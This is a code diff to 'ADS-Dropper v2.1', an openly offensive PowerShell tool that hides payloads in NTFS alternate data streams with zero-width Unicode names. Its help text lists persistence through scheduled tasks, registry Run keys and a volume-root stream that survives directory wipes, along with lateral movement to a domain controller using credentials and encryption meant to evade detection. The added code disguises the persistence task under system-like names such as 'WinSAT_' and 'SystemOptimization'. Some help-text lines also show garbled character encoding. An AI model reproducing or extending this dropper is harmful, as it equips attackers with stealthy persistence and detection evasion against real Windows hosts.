@@ -155,7 +155,7 @@ param(
 # Help display function
 function Show-Help {
     $helpText = @"
-╔══════════════════════════════════════════════════════════════════════════╗ ║ ADS-Dropper v2.1 - Quick Reference ║ ╚══════════════════════════════════════════════════════════════════════════╝
+â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•— â•‘ ADS-Dropper v2.1 - Quick Reference â•‘ â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 USAGE: .\ADS-Dropper.ps1 -Payload <string|file> [OPTIONS]
 REQUIRED: -Payload <string|array> Payload to deploy (command or @('file.ps1'))
 OPTIONAL: -Targets <array> Target hosts (default: @('localhost')) -Persist <array> Persistence methods: task, reg, volroot -Randomize Randomize artifacts for evasion -Encrypt AES-256 encrypt payload -NoExec Stage without executing -Credential <PSCredential> Creds for remote deployment
@@ -167,11 +167,11 @@ Full stealth (RECOMMENDED)
 Multiple persistence methods
 .\ADS-Dropper.ps1 -Payload `$payload -Persist @('task','reg')
 Lateral movement
-$cred = Get-Credential .\ADS-Dropper.ps1 -Payload payload−Targets@(′dc01′)−Credential‘payload -Targets @('dc01') -Credential ` payload−Targets@(′dc01′)−Credential
+$cred = Get-Credential .\ADS-Dropper.ps1 -Payload payloadâˆ’Targets@(â€²dc01â€²)âˆ’Credentialâ€˜payload -Targets @('dc01') -Credential ` payloadâˆ’Targets@(â€²dc01â€²)âˆ’Credential
 PERSISTENCE METHODS:
-task Scheduled Task (admin required) └─ Triggers: Logon + periodic (every 5 min) └─ Path: \Microsoft\Windows\UX* or ...\UsbCeip
-reg Registry Run Key (user or admin) └─ HKCU/HKLM:...\CurrentVersion\Run └─ Fallback if not admin
-volroot Volume Root ADS (admin required, NOVEL) └─ Stores command in C::ads_* └─ No parent file, survives directory wipes
+task Scheduled Task (admin required) â””â”€ Triggers: Logon + periodic (every 5 min) â””â”€ Path: \Microsoft\Windows\UX* or ...\UsbCeip
+reg Registry Run Key (user or admin) â””â”€ HKCU/HKLM:...\CurrentVersion\Run â””â”€ Fallback if not admin
+volroot Volume Root ADS (admin required, NOVEL) â””â”€ Stores command in C::ads_* â””â”€ No parent file, survives directory wipes
 ENCRYPTION:
 -Encrypt enables AES-256 with machine-specific key (UUID+hostname)
 Pros: Prevents static analysis, evades content-based detection Cons: Requires PowerShell loader (more telemetry than VBScript)
@@ -286,7 +286,9 @@ param(
 
     [string]$ManifestPath,
 
-    [switch]$NoExec
+    [switch]$NoExec,
+
+    [switch]$GenerateOnly  # NEW: Return configuration instead of executing
 )
 
 #region Zero-Width Unicode Functions
@@ -734,6 +736,39 @@ if ($ZeroWidthStreams) {
     Write-Warning "Zero-width stream - Codepoints: $($config.Codepoints)"
 }
 
+# Generate task name (for both GenerateOnly and normal execution)
+$taskName = if ($Randomize) {
+    "WinSAT_" + (-join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ }))
+} else {
+    "SystemOptimization"
+}
+
+# If GenerateOnly mode, return configuration and exit
+if ($GenerateOnly) {
+    # Convert stream name to escaped format for command generation
+    $streamChars = $config.StreamName.ToCharArray()
+    $streamNameEscaped = -join ($streamChars | ForEach-Object {
+        "[char]0x{0:X4}" -f [int]$_
+    })
+    
+    # Return configuration object
+    return [PSCustomObject]@{
+        HostPath = $config.HostPath
+        StreamName = $config.StreamName
+        StreamNameEscaped = $streamNameEscaped
+        Codepoints = $config.Codepoints
+        TaskName = $taskName
+        Payload = $Payload
+        PayloadEncrypted = $Encrypt.IsPresent
+        PersistenceMethod = $Persist
+        DecoysCount = $CreateDecoys
+        ZeroWidthMode = $ZeroWidthMode
+        HybridPrefix = $HybridPrefix
+        Randomized = $Randomize.IsPresent
+    }
+}
+
+# Normal execution path (not GenerateOnly)
 # Create decoys
 if ($CreateDecoys -gt 0) {
     Create-DecoyStreams -HostPath $config.HostPath -Count $CreateDecoys
@@ -758,7 +793,7 @@ if ($Persist -ne 'none') {
 
     switch ($Persist) {
         'task' {
-            $taskName = Create-ScheduledTaskPersistence -LoaderScript $loader
+            $taskName = Create-ScheduledTaskPersistence -LoaderScript $loader -TaskName $taskName
             Write-Host "[+] Persistence: Scheduled Task '$taskName'" -ForegroundColor Green
         }
         'registry' {
